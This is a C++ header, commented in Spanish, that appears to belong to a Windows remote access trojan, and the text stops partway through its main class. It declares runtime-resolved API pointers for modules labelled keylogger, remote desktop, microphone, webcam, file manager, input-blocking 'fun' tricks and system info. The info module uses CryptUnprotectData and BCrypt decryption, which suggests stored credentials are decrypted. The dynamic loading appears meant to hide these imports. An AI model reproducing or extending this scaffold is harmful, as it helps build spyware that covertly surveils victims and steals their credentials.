#ifndef _DYNAMIC
#define _DYNAMIC 1

// TODO merge de todas las estructuras y evitar multiples

#include "headers.hpp"

//Mod Camara
#include<cwchar>
#include<mfapi.h>
#include<mfidl.h>
#include<mfobjects.h>
#include<mfreadwrite.h>
#include<mferror.h>
#include<mftransform.h>
#include<Wmcodecdsp.h>
#include<propvarutil.h>
#include<shlwapi.h>

#include<gdiplusenums.h>
#include<gdiplustypes.h>
#include<gdipluspixelformats.h>
#include<gdiplusimaging.h>
#include<gdiplusinit.h>
#include<gdiplusGpStubs.h>
#include<gdipluscolor.h>
#include<gdipluscolormatrix.h>
#include<gdiplusmetaheader.h>
#include<gdiplusflat.h>

#include "misc.hpp"


#define LOAD_DLL(hModule, cPath)              \
	do{						                  \
		if(hModule == NULL){                  \
			hModule = wrapLoadDLL(cPath); 	  \
		}                                     \
	} while(0)

#define UNLOAD_DLL(hModule)           \
	do{						          \
		if(hModule != nullptr){       \
			wrapFreeLibrary(hModule); \
			hModule = nullptr;        \
		}                             \
	} while(0)

typedef struct _WTS_PROCESS_INFOA {
	DWORD SessionId;
	DWORD ProcessId;
	LPSTR pProcessName;
	PSID  pUserSid;
} WTS_PROCESS_INFOA, * PWTS_PROCESS_INFOA;

HRESULT WINAPI MyMFSetAttributeSize(IMFAttributes* , REFGUID , UINT32 , UINT32 );
HRESULT WINAPI MyMFGetAttributeSize(IMFAttributes* , REFGUID , UINT32* , UINT32* );
HRESULT WINAPI MyMFSetAttributeRatio(IMFAttributes* , REFGUID , UINT32 , UINT32 );
HRESULT WINAPI MyMFGetAttributeRatio(IMFAttributes* , REFGUID , UINT32* , UINT32* );

//Structs para dynamic_load
struct st_Kernel32 {
	//GetComputerNameA
	typedef BOOL(WINAPI* LPGETCOMPUTERNAMEA)(LPSTR, LPDWORD);
	LPGETCOMPUTERNAMEA pGetComputerName = nullptr;

	//GetModuleHandleA
	typedef HMODULE(WINAPI* LPGETMODULEHANDLEA)(LPCSTR);
	LPGETMODULEHANDLEA pGetModuleHandleA = nullptr;

	//GetNativeSystemInfo
	typedef void(WINAPI* LPGETNATIVESYSTEMINFO)(LPSYSTEM_INFO);
	LPGETNATIVESYSTEMINFO pGetNativeSystemInfo = nullptr;

	//CreateProcessA
	typedef BOOL(WINAPI* LPCREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
	LPCREATEPROCESSA pCreateProcessA = nullptr;

	//OpenProcess
	typedef HANDLE(WINAPI* LPOPENPROCESS)(DWORD, BOOL, DWORD);
	LPOPENPROCESS pOpenProcess = nullptr;

	//TerminateProcess
	typedef BOOL(WINAPI* LPTERMINATEPROCESS)(HANDLE, UINT);
	LPTERMINATEPROCESS pTerminateProcess = nullptr;

	//CloseHandle
	typedef BOOL(WINAPI* LPCLOSEHANDLE)(HANDLE);
	LPCLOSEHANDLE pCloseHandle = nullptr;

	//GlobalMemoryStatusEx
	typedef BOOL(WINAPI* LPGLOBALMEMORYSTATUSEX)(LPMEMORYSTATUSEX);
	LPGLOBALMEMORYSTATUSEX pGlobalMemoryStatusEx = nullptr;

	//CopyFileA
	typedef BOOL(WINAPI* LPCOPYFILEA)(LPCSTR, LPCSTR, BOOL);
	LPCOPYFILEA pCopyFileA = nullptr;

	//DeleteFileA
	typedef BOOL(WINAPI* LPDELETEFILEA)(LPCSTR);
	LPDELETEFILEA pDeleteFileA = nullptr;

	//ReadFile
	typedef BOOL(WINAPI* LPREADFILE)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
	LPREADFILE pReadFile = nullptr;

	//WriteFile
	typedef BOOL(WINAPI* LPWRITEFILE)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
	LPWRITEFILE pWriteFile = nullptr;

	//CreatePipe
	typedef BOOL(WINAPI* LPCREATEPIPE)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
	LPCREATEPIPE pCreatePipe = nullptr;

	//PeekNamedPipe
	typedef BOOL(WINAPI* LPPEEKNAMEDPIPE)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD);
	LPPEEKNAMEDPIPE pPeekNamedPipe = nullptr;

	//GlobalAlloc
	typedef HGLOBAL(WINAPI* LPGLOBALALLOC)(UINT, SIZE_T);
	LPGLOBALALLOC pGlobalAlloc = nullptr;

	//GlobalFree
	typedef HGLOBAL(WINAPI* LPGLOBALFREE)(HGLOBAL);
	LPGLOBALFREE pGlobalFree = nullptr;
};

struct st_Kernel32_FM {
	//GetLogicalDriveStringsA
	typedef DWORD(WINAPI* LPGETLOGICALDRIVESTRINGSA)(DWORD, LPSTR);
	LPGETLOGICALDRIVESTRINGSA pGetLogicalDriveStringsA = nullptr;

	//GetVolumeInformationA
	typedef BOOL(WINAPI* LPGETVOLUMEINFORMATIONA)(LPCSTR, LPSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPSTR, DWORD);
	LPGETVOLUMEINFORMATIONA pGetVolumeInformationA = nullptr;

	//GetDriveTypeA
	typedef UINT(WINAPI* LPGETDRIVETYPEA)(LPCSTR);
	LPGETDRIVETYPEA pGetDriveTypeA = nullptr;

	//GetDiskFreeSpaceExA
	typedef BOOL(WINAPI* LPGETDISKFREESPACEEXA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
	LPGETDISKFREESPACEEXA pGetDiskFreeSpaceExA = nullptr;

	//FindFirstFileA
	typedef HANDLE(WINAPI* LPFINDFIRSTFILEA)(LPCSTR, LPWIN32_FIND_DATAA);
	LPFINDFIRSTFILEA pFindFirstFileA = nullptr;

	//FileTimeToSystemTime
	typedef BOOL(WINAPI* LPFILETIMETOSYSTEMTIME)(CONST FILETIME*, LPSYSTEMTIME);
	LPFILETIMETOSYSTEMTIME pFileTimeToSystemTime = nullptr;

	//FindNextFileA
	typedef BOOL(WINAPI* LPFINDNEXTFILEA)(HANDLE, LPWIN32_FIND_DATAA);
	LPFINDNEXTFILEA pFindNextFileA = nullptr;

	//FindClose
	typedef BOOL(WINAPI* LPFINDCLOSE)(HANDLE);
	LPFINDCLOSE pFindClose = nullptr;
	
	//CreateDirectoryA
	typedef BOOL(WINAPI* LPCREATEDIRECTORYA)(LPCSTR, LPSECURITY_ATTRIBUTES);
	LPCREATEDIRECTORYA pCreateDirectoryA = nullptr;

	//CreateFileA
	typedef HANDLE(WINAPI* LPCREATEFILEA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
	LPCREATEFILEA pCreateFileA = nullptr;

	//CloseHandle
	typedef BOOL(WINAPI* LPCLOSEHANDLE)(HANDLE);
	LPCLOSEHANDLE pCloseHandle = nullptr;

	//DeleteFileA
	typedef BOOL(WINAPI* LPDELETEFILEA)(LPCSTR);
	LPDELETEFILEA pDeleteFileA = nullptr;

	//MoveFileA
	typedef BOOL(WINAPI* LPMOVEFILEA)(LPCSTR, LPCSTR);
	LPMOVEFILEA pMoveFileA = nullptr;

	//RemoveDirectoryA
	typedef BOOL(WINAPI* LPREMOVEDIRECTORYA)(LPCSTR);
	LPREMOVEDIRECTORYA pRemoveDirectoryA = nullptr;
};

struct st_Advapi32 {
	//GetUserName
	typedef BOOL(WINAPI* LPGETUSERNAMEA)(LPSTR, LPDWORD);
	LPGETUSERNAMEA pGetUserName = nullptr;

	//RegOpenKeyEx
	typedef LSTATUS(WINAPI* LPREGOPENKEY)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
	LPREGOPENKEY pRegOpenKeyEx = nullptr;

	//RegQueryValueEx
	typedef LSTATUS(WINAPI* LPREGQUERYVALUEEX)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
	LPREGQUERYVALUEEX pRegQueryValueEx = nullptr;

	//RegCloseKey
	typedef LSTATUS(WINAPI* LPREGCLOSEKEY)(HKEY);
	LPREGCLOSEKEY pRegCloseKey = nullptr;

	//LookupAccountSidA
	typedef BOOL(WINAPI* LPLOOKUPACCOUNTSIDA)(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
	LPLOOKUPACCOUNTSIDA pLookupAccountSidA = nullptr;
};

struct st_Shell32 {
	//ShellExecuteExA
	typedef BOOL(WINAPI* LPSHELLEXECUTEEXA)(SHELLEXECUTEINFOA*);
	LPSHELLEXECUTEEXA pShellExecuteExA = nullptr;
};

struct st_PsApi {
	//GetModuleFileNameExA
	typedef DWORD(WINAPI* LPGETMODULEFILNAMEEX)(HANDLE, HMODULE, LPSTR, DWORD);
	LPGETMODULEFILNAMEEX pGetModuleFileNameExA = nullptr;
};

struct st_Wtsapi32 {
	//WTSEnumerateProcessesA
	typedef BOOL(WINAPI* LPWTSENUMERATEPROCESSES)(HANDLE, DWORD, DWORD, PWTS_PROCESS_INFOA*, DWORD*);
	LPWTSENUMERATEPROCESSES pWTSEnumerateProcessesA = nullptr;

	//WTSFreeMemory
	typedef void(WINAPI* LPWTSFREEMEMORY)(PVOID);
	LPWTSFREEMEMORY pWTSFreeMemory = nullptr;

};

struct st_Ws2_32 {
	//WSAStartup
	typedef int(WINAPI* LPWSASTARTUP)(WORD, LPWSADATA);
	LPWSASTARTUP pWsaStartup = nullptr;

	//inet_addr
	typedef unsigned long(WINAPI* LPINET_ADDR)(const char*);
	LPINET_ADDR pinet_addr = nullptr;

	//inet_ntoa
	//typedef char WSAAPI*(WINAPI* LPINET_NTOA)(in_addr);

};

struct st_User32_Fun {
	//SwapMouseButton
	typedef BOOL(WINAPI* LPSWAPMOUSEBUTTON)(BOOL);
	LPSWAPMOUSEBUTTON pSwapMouseButton = nullptr;

	//BlockInput
	typedef BOOL(WINAPI* LPBLOCKINPUT)(BOOL);
	LPBLOCKINPUT pBlockInput = nullptr;

	//MessageBox
	typedef int(WINAPI* LPMESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, UINT);
	LPMESSAGEBOX pMessageBoxA = nullptr;
};

struct st_User32_WM {
	//IsWindowVisible
	typedef BOOL(WINAPI* LPISWINDOWVISIBLE)(HWND);
	LPISWINDOWVISIBLE pIsWindowVisible = nullptr;

	//GetWindowTextA
	typedef int(WINAPI* LPGETWINDOWTEXTA)(HWND, LPSTR, int);
	LPGETWINDOWTEXTA pGetWindowTextA = nullptr;

	//GetForegroundWindow
	typedef HWND(WINAPI* LPGETFOREGROUNDWINDOW)();
	LPGETFOREGROUNDWINDOW pGetForegroundWindow = nullptr;

	//EnumWindows
	typedef BOOL(WINAPI* LPENUMWINDOWS)(WNDENUMPROC, LPARAM);
	LPENUMWINDOWS pEnumWindows = nullptr;

	//FindWindowA
	typedef HWND(WINAPI* LPFINDWINDOWA)(LPCSTR, LPCSTR);
	LPFINDWINDOWA pFindWindowA = nullptr;

	//ShowWindow
	typedef BOOL(WINAPI* LPSHOWWINDOW)(HWND, int);
	LPSHOWWINDOW pShowWindow = nullptr;
};

struct st_User32_RD {
	//SendInput
	typedef UINT(WINAPI* LPSENDINPUT)(UINT, LPINPUT, int);
	LPSENDINPUT pSendInput = nullptr;

	//GetDC
	typedef HDC(WINAPI* LPGETDC)(HWND);
	LPGETDC pGetDC = nullptr;

	//ReleaseDC
	typedef int(WINAPI* LPRELEASEDC)(HWND, HDC);
	LPRELEASEDC pReleaseDC = nullptr;

	//GetDesktopWindow
	typedef HWND(WINAPI* LPGETDESKTOPWINDOW)();
	LPGETDESKTOPWINDOW pGetDesktopWindow = nullptr;

	//EnumDisplayMonitors
	typedef BOOL(WINAPI* LPENUMDISPLAYMONITORS)(HDC, LPCRECT, MONITORENUMPROC, LPARAM);
	LPENUMDISPLAYMONITORS pEnumDisplayMonitors = nullptr;

	//GetMonitorInfoA
	typedef BOOL(WINAPI* LPGETMONITORINFOA)(HMONITOR, LPMONITORINFO);
	LPGETMONITORINFOA pGetMonitorInfoA = nullptr;

	//GetCursorInfo 
	typedef BOOL(WINAPI* LPGETCURSORINFO)(PCURSORINFO);
	LPGETCURSORINFO pGetCursorInfo = nullptr;

	//SetCursorPos
	typedef BOOL(WINAPI* LPSETCURSORPOS)(int, int);
	LPSETCURSORPOS pSetCursorPos = nullptr;

	//GetWindowRect 
	typedef BOOL(WINAPI* LPGETWINDOWRECT)(HWND, LPRECT);
	LPGETWINDOWRECT pGetWindowRect = nullptr;

	//GetIconInfo
	typedef BOOL(WINAPI* LPGETICONINFO)(HICON, PICONINFO);
	LPGETICONINFO pGetIconInfo = nullptr;

	//DrawIconEx
	typedef BOOL(WINAPI* LPDRAWICONEX)(HDC, int, int, HICON, int, int, UINT, HBRUSH, UINT);
	LPDRAWICONEX pDrawIconEx = nullptr;
};

struct st_User32_KL {
	//GetWindowTextA
	typedef int(WINAPI* LPGETWINDOWTEXTA)(HWND, LPSTR, int);
	LPGETWINDOWTEXTA pGetWindowTextA = nullptr;

	//GetForegroundWindow
	typedef HWND(WINAPI* LPGETFOREGROUNDWINDOW)();
	LPGETFOREGROUNDWINDOW pGetForegroundWindow = nullptr;

	//UnhookWindowsHookEx
	typedef BOOL(WINAPI* LPUNHOOKWINDOWSHOOKEX)(HHOOK);
	LPUNHOOKWINDOWSHOOKEX pUnhookWindowsHookEx = nullptr;

	//CallNextHookEx
	typedef LRESULT(WINAPI* LPCALLNEXTHOOKEX)(HHOOK, int, WPARAM, LPARAM);
	LPCALLNEXTHOOKEX pCallNextHookEx = nullptr;

	//SetWindowsHookExA
	typedef HHOOK(WINAPI* LPSETWINDOWSHOOKEXA)(int, HOOKPROC, HINSTANCE, DWORD);
	LPSETWINDOWSHOOKEXA pSetWindowsHookExA = nullptr;

	//PostQuitMessage
	typedef void(WINAPI* LPPOSTQUITMESSAGE)(int);
	LPPOSTQUITMESSAGE pPostQuitMessage = nullptr;

	//PeekMessageA
	typedef BOOL(WINAPI* LPPEEKMESSAGEA)(LPMSG, HWND, UINT, UINT, UINT);
	LPPEEKMESSAGEA pPeekMessageA = nullptr;

	//GetMessageA
	typedef BOOL(WINAPI* LPGETMESSAGEA)(LPMSG, HWND, UINT, UINT);
	LPGETMESSAGEA pGetMessageA = nullptr;

	//TranslateMessage
	typedef BOOL(WINAPI* LPTRANSLATEMESSAGE)(const MSG*);
	LPTRANSLATEMESSAGE pTranslateMessage = nullptr;

	//DispatchMessageA
	typedef LRESULT(WINAPI* LPDISPATCHMESSAGEA)(const MSG*);
	LPDISPATCHMESSAGEA pDispatchMessageA = nullptr;
};

struct st_Gdi32 {
	//CreateCompatibleDC
	typedef HDC(WINAPI* LPCREATECOMPATIBLEDC)(HDC);
	LPCREATECOMPATIBLEDC pCreateCompatibleDC = nullptr;

	//CreateCompatibleBitmap
	typedef HBITMAP(WINAPI* LPCREATECOMPATIBLEBITMAP)(HDC, int, int);
	LPCREATECOMPATIBLEBITMAP pCreateCompatibleBitmap = nullptr;

	//SelectObject
	typedef HGDIOBJ(WINAPI* LPSELECTOBJECT)(HDC, HGDIOBJ);
	LPSELECTOBJECT pSelectObject = nullptr;

	//GetObjectA
	typedef int(WINAPI* LPGETOBJECTA)(HANDLE, int, LPVOID);
	LPGETOBJECTA pGetObjectA = nullptr;

	//BitBlt
	typedef BOOL(WINAPI* LPBITBLT)(HDC, int, int, int, int, HDC, int, int, DWORD);
	LPBITBLT pBitBlt = nullptr;

	//DeleteDC
	typedef BOOL(WINAPI* LPDELETEDC)(HDC);
	LPDELETEDC pDeleteDC = nullptr;

	//DeleteObject
	typedef BOOL(WINAPI* LPDELETEOBJECT)(HGDIOBJ);
	LPDELETEOBJECT pDeleteObject = nullptr;
};

struct st_Ole32 {
	//CreateStreamOnHGlobal
	typedef HRESULT(WINAPI* LPCREATESTREAMONHGLOBAL)(HGLOBAL, BOOL, LPSTREAM*);
	LPCREATESTREAMONHGLOBAL pCreateStreamOnHGlobal = nullptr;

	//CoTaskMemFree
	typedef void(WINAPI* LPCOTASKMEMFREE)(LPVOID);
	LPCOTASKMEMFREE pCoTaskMemFree = nullptr;

	//CoCreateInstance
	typedef HRESULT(WINAPI* LPCOCREATEINSTANCE)(
		REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
	LPCOCREATEINSTANCE pCoCreateInstance = nullptr;

	//CoInitialize
	typedef HRESULT(WINAPI* LPCOINITIALIZE)(LPVOID);
	LPCOINITIALIZE pCoInitialize = nullptr;
	
	//CoUninitialize;
	typedef void(WINAPI* LPCOUNITIALIZE)();
	LPCOUNITIALIZE pCoUninitialize = nullptr;
};

struct st_GdiPlus {
	//GdiplusStartup
	typedef GpStatus(WINGDIPAPI* LPGDIPLUSSTARTUP)(ULONG_PTR*, const GdiplusStartupInput*, GdiplusStartupOutput*);
	LPGDIPLUSSTARTUP pGdiplusStartup = nullptr;

	//GdiplusShutdown
	typedef void(WINGDIPAPI* LPGDIPLUSSHUTDOWN)(ULONG_PTR);
	LPGDIPLUSSHUTDOWN pGdiplusShutdown = nullptr;

	//GdipGetImageEncodersSize
	typedef GpStatus(WINGDIPAPI* LPGETIMAGEENCODERSSIZE)(UINT*, UINT*);
	LPGETIMAGEENCODERSSIZE pGdipGetImageEncodersSize = nullptr;

	//GdipGetImageEncoders
	typedef GpStatus(WINGDIPAPI* LPGETIMAGEENCODERS)(UINT, UINT, ImageCodecInfo*);
	LPGETIMAGEENCODERS pGdipGetImageEncoders = nullptr;

	//GdipSaveImageToStream
	typedef GpStatus(WINGDIPAPI* LPGDIPSAVEIMAGETOSTREAM)(GpImage*, IStream*, GDIPCONST CLSID*, GDIPCONST EncoderParameters*);
	LPGDIPSAVEIMAGETOSTREAM pGdipSaveImageToStream = nullptr;

	//GdipBitmapLockBits
	typedef GpStatus(WINGDIPAPI* LPGDIPBITMAPLOCKBITS)(GpBitmap*, GDIPCONST GpRect*, UINT, PixelFormat, BitmapData*);
	LPGDIPBITMAPLOCKBITS pGdipBitmapLockBits = nullptr;

	//GdipBitmapUnlockBits
	typedef GpStatus(WINGDIPAPI* LPGDIPBITMAPUNLOCKBITS)(GpBitmap*, BitmapData*);
	LPGDIPBITMAPUNLOCKBITS pGdipBitmapUnlockBits = nullptr;

	//GdipGetImageWidth
	typedef GpStatus(WINGDIPAPI* LPGDIPGETIMAGEWIDTH)(GpImage*, UINT*);
	LPGDIPGETIMAGEWIDTH pGdipGetImageWidth = nullptr;
	
	//GdipGetImageHeight
	typedef GpStatus(WINGDIPAPI* LPGDIPGETIMAGEHEIGHT)(GpImage*, UINT*);
	LPGDIPGETIMAGEHEIGHT pGdipGetImageHeight = nullptr;
	
	//GdipGetImagePixelFormat
	typedef GpStatus(WINGDIPAPI* LPGDIPGETIMAGEPIXELFORMAT)(GpImage*, PixelFormat*);
	LPGDIPGETIMAGEPIXELFORMAT pGdipGetImagePixelFormat = nullptr;

	//GdipCloneBitmapAreaI
	typedef GpStatus(WINGDIPAPI* LPGDIPCLONEBITMAPAREAI)(INT, INT, INT, INT, PixelFormat, GpBitmap*, GpBitmap**);
	LPGDIPCLONEBITMAPAREAI pGdipCloneBitmapAreaI = nullptr;

	//GdipCreateBitmapFromHBITMAP
	typedef GpStatus(WINGDIPAPI* LPGDIPCREATEBITMAPFROMHBITMAP)(HBITMAP, HPALETTE, GpBitmap**);
	LPGDIPCREATEBITMAPFROMHBITMAP pGdipCreateBitmapFromHBITMAP = nullptr;

	//GdipCreateBitmapFromScan0
	typedef GpStatus(WINGDIPAPI* LPGDIPCREATEBITMAPFROMSCAN0)(INT, INT, INT, PixelFormat, BYTE*, GpBitmap**);
	LPGDIPCREATEBITMAPFROMSCAN0 pGdipCreateBitmapFromScan0 = nullptr;

	//GdipDisposeImage
	typedef GpStatus(WINGDIPAPI* LPGDIPDISPOSEIMAGE)(GpImage*);
	LPGDIPDISPOSEIMAGE pGdipDisposeImage = nullptr;

	//GdipLoadImageFromStream
	typedef GpStatus(WINGDIPAPI* LPGDIPLOADIMAGEFROMSTREAM)(IStream*, GpImage**);
	LPGDIPLOADIMAGEFROMSTREAM pGdipLoadImageFromStream = nullptr;

	//GdipCreateBitmapFromStream
	typedef GpStatus(WINGDIPAPI* LPGDIPCREATEBITMAPFROMSTREAM)(IStream*, GpBitmap**);
	LPGDIPCREATEBITMAPFROMSTREAM pGdipCreateBitmapFromStream = nullptr;
};

struct st_Winmm {
	//mciSendStringA
	typedef MCIERROR(WINAPI* LPMCISENDSTRINGA)(LPCTSTR, LPTSTR, UINT, HANDLE);
	LPMCISENDSTRINGA pMciSendStringA = nullptr;
};

struct st_WinmmMic {
	//waveInGetDevCapsA
	typedef MMRESULT(WINAPI* LPWAVEINGETDEVCAPSA)(UINT, LPWAVEINCAPS, UINT);
	LPWAVEINGETDEVCAPSA pWaveInGetDevCapsA = nullptr;

	//waveInGetNumDevs
	typedef UINT(WINAPI* LPWAVEINGETNUMDEVS)();
	LPWAVEINGETNUMDEVS pWaveInGetNumDevs = nullptr;

	//waveInOpen
	typedef MMRESULT(WINAPI* LPWAVEINOPEN)(LPHWAVEIN, UINT, LPCWAVEFORMATEX, DWORD_PTR, DWORD_PTR, DWORD);
	LPWAVEINOPEN pWaveInOpen = nullptr;

	//waveInStart
	typedef MMRESULT(WINAPI* LPWAVEINSTART)(HWAVEIN);
	LPWAVEINSTART pWaveInStart = nullptr;

	//waveInStop
	typedef MMRESULT(WINAPI* LPWAVEINSTOP)(HWAVEIN);
	LPWAVEINSTOP pWaveInStop = nullptr;

	//waveInClose
	typedef MMRESULT(WINAPI* LPWAVEINCLOSE)(HWAVEIN);
	LPWAVEINCLOSE pWaveInClose = nullptr;

	//waveInPrepareHeader
	typedef MMRESULT(WINAPI* LPWAVEINPREPAREHEADER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINPREPAREHEADER pWaveInPrepareHeader = nullptr;

	//waveInUnprepareHeader
	typedef MMRESULT(WINAPI* LPWAVEINUNPREPAREHEADER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINUNPREPAREHEADER pWaveInUnprepareHeader = nullptr;

	//waveInAddBuffer
	typedef MMRESULT(WINAPI* LPWAVEINADDBUFFER)(HWAVEIN, LPWAVEHDR, UINT);
	LPWAVEINADDBUFFER pWaveInAddBuffer = nullptr;
};

struct st_Bcrypt {
	//BCryptDecrypt
	typedef NTSTATUS(WINAPI* LPBCRYPTDECRYPT)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
	LPBCRYPTDECRYPT pBCryptDecrypt = nullptr;

	//BCryptGenerateSymmetricKey
	typedef NTSTATUS(WINAPI* LPBCRYPTGENERATESYMMETRICKEY)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
	LPBCRYPTGENERATESYMMETRICKEY pBCryptGenerateSymmetricKey = nullptr;

	//BCryptOpenAlgorithmProvider
	typedef NTSTATUS(WINAPI* LPLPBCRYPTOPENALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
	LPLPBCRYPTOPENALGORITHMPROVIDER pBCryptOpenAlgorithmProvider = nullptr;

	//BCryptCloseAlgorithmProvider
	typedef NTSTATUS(WINAPI* LPBCRYPTCLOSEALGORITHMPROVIDER)(BCRYPT_ALG_HANDLE, ULONG);
	LPBCRYPTCLOSEALGORITHMPROVIDER pBCryptCloseAlgorithmProvider = nullptr;

	//BCryptSetProperty
	typedef NTSTATUS(WINAPI* LPBCRYPTSETPROPERTY)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
	LPBCRYPTSETPROPERTY pBCryptSetProperty = nullptr;
};

struct st_Crypt32 {
	//CryptUnprotectData
	typedef DPAPI_IMP BOOL(WINAPI* LPCRYPTUNPROTECTDATA)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
	LPCRYPTUNPROTECTDATA pCryptUnprotectData = nullptr;
};

struct st_Netapi32 {
	//NetUserEnum
	typedef NET_API_STATUS(WINAPI* LPNETUSERENUM)(LPCWSTR, DWORD, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, PDWORD);
	LPNETUSERENUM pNetUserEnum = nullptr;

	//NetApiBufferFree
	typedef NET_API_STATUS(WINAPI* LPNETAPIBUFFERFREE)(LPVOID);
	LPNETAPIBUFFERFREE pNetApiBufferFree = nullptr;
};

struct st_Shlwapi {
	//SHCreateMemStream
	typedef IStream* (WINAPI* LPSHCREATEMEMSTREAM)(const BYTE*, UINT);
	LPSHCREATEMEMSTREAM pSHCreateMemStream = nullptr;
};

struct st_Mfreadwrite {
	//MFCreateSourceReaderFromMediaSource
	typedef HRESULT(WINAPI* LPMFCREATESOURCEREADERFROMMEDIASOURCE)(
		IMFMediaSource*, IMFAttributes*, IMFSourceReader**);
	LPMFCREATESOURCEREADERFROMMEDIASOURCE pMFCreateSourceReaderFromMediaSource = nullptr;
};

struct st_Mfapi {
	//MFGetAttributeSize
	typedef HRESULT(WINAPI* LPMFGETATTRIBUTESIZE)(IMFAttributes*, REFGUID, UINT32*, UINT32*);
	LPMFGETATTRIBUTESIZE pMFGetAttributeSize = &MyMFGetAttributeSize;

	//MFGetAttributeRatio
	typedef HRESULT(WINAPI* LPMFGETATTRIBUTERATIO)(IMFAttributes*, REFGUID, UINT32*, UINT32*);
	LPMFGETATTRIBUTERATIO pMFGetAttributeRatio = &MyMFGetAttributeRatio;

	//MFSetAttributeRatio
	typedef HRESULT(WINAPI* LPMFSETATTRIBUTERATIO)(IMFAttributes*, REFGUID, UINT32, UINT32);
	LPMFSETATTRIBUTERATIO pMFSetAttributeRatio = &MyMFSetAttributeRatio;

	//MFSetAttributeSize
	typedef HRESULT(WINAPI* LPMFSETATTRIBUTESIZE)(IMFAttributes*, REFGUID, UINT32, UINT32);
	LPMFSETATTRIBUTESIZE pMFSetAttributeSize = &MyMFSetAttributeSize;
};

struct st_Mfplat {
	//MFStartup
	typedef HRESULT(WINAPI* LPMFSTARTUP)(ULONG, DWORD);
	LPMFSTARTUP pMFStartup = nullptr;
	
	//MFShutdown
	typedef HRESULT(WINAPI* LPMFSHUTDOWN)();
	LPMFSHUTDOWN pMFShutdown = nullptr;
	
	//MFCreateAttributes
	typedef HRESULT(WINAPI* LPMFCREATEATTRIBUTES)(IMFAttributes**, UINT32);
	LPMFCREATEATTRIBUTES pMFCreateAttributes = nullptr;

	//MFTRegisterLocalByCLSID
	typedef HRESULT(WINAPI* LPMFTREGISTERLOCALBYCLSID)(
		REFCLSID, REFGUID, LPCWSTR, UINT32,
		UINT32, const MFT_REGISTER_TYPE_INFO*,
		UINT32, const MFT_REGISTER_TYPE_INFO*);
	LPMFTREGISTERLOCALBYCLSID pMFTRegisterLocalByCLSID = nullptr;

	//MFCreateMediaType
	typedef HRESULT(WINAPI* LPMFCREATEMEDIATYPE)(IMFMediaType**);
	LPMFCREATEMEDIATYPE pMFCreateMediaType = nullptr;

	//MFCreateSample
	typedef HRESULT(WINAPI* LPMFCREATESAMPLE)(IMFSample**);
	LPMFCREATESAMPLE pMFCreateSample = nullptr;

	//MFCreateMemoryBuffer
	typedef HRESULT(WINAPI* LPMFCREATEMEMORYBUFFER)(DWORD, IMFMediaBuffer**);
	LPMFCREATEMEMORYBUFFER pMFCreateMemoryBuffer = nullptr;
};

struct st_Mf {
	//MFEnumDeviceSources
	typedef HRESULT(WINAPI* LPMFENUMDEVICESOURCES)(IMFAttributes*, IMFActivate***, UINT32*);
	LPMFENUMDEVICESOURCES pMFEnumDeviceSources = nullptr;
};

#include "mod_camara.hpp"

class DynamicLoad {
	private:
		//DLLs para dynamic_load
		HMODULE hKernel32DLL = NULL;
		HMODULE hAdvapi32DLL = NULL;
		HMODULE hShell32DLL  = NULL;
		HMODULE hWtsapi32DLL = NULL;
		HMODULE hPsApiDLL    = NULL;
		HMODULE hUser32DLL   = NULL;
		HMODULE hWs2_32DLL   = NULL;
		HMODULE hWinmmDLL    = NULL;

		//Mod remote desktop
		HMODULE hGdi32DLL = NULL;
		HMODULE hOle32 = NULL;
		HMODULE hGdiPlusDLL = NULL;

		//Mod info
		HMODULE hBCryptDLL = NULL;
		HMODULE hCrypt32DLL = NULL;
		HMODULE hNetApi32DLL = NULL;

		//Mod camara
		HMODULE hMfreadwriteDLL = NULL;
		HMODULE hMfDLL = NULL;
		HMODULE hMfplatDLL = NULL;
		HMODULE hShlwapiDLL = NULL;


	public:
		DynamicLoad();
		~DynamicLoad();

		//Mod fun
		void LoadFunProcs();
		void UnloadFunDlls();

		//Mod ventanas
		void LoadWMProcs();

		//Mod escritorio remoto
		void LoadRDProcs();
		void UnloadRDDlls();

		//Mod microfono
		void LoadMicProcs();
		void UnloadMicProcs();

		//Keylogger
		void LoadKLProcs();

		//Informacion
		void LoadInfoProcs();
		void UnloadInfoProcs();

		//Mod adm de arhivos
		void LoadFMProcs();

		//Camara
		void LoadCamProcs();
		void UnloadCamPros();

		//Generales
		st_Advapi32 ADVAPI32;
		st_Shell32   SHELL32;
		st_Kernel32 KERNEL32;
		st_Wtsapi32 WTSAPI32;
		st_PsApi	   PSAPI;
		st_Ws2_32	    WS32;
		st_Winmm	   WINMM;

		//Custom para cada mod
		st_User32_Fun   USER32_FUN;
		st_User32_WM    USER32_WM;

		//Remote desktop
		st_User32_RD USER32_RD;
		st_Gdi32 GDI32_RD;
		st_GdiPlus GDIPLUS_RD;
		st_Ole32 OLE32;

		//Microfono
		st_WinmmMic WINMMMIC;

		//Keylogger
		st_User32_KL USER32_KL;

		//Informacion
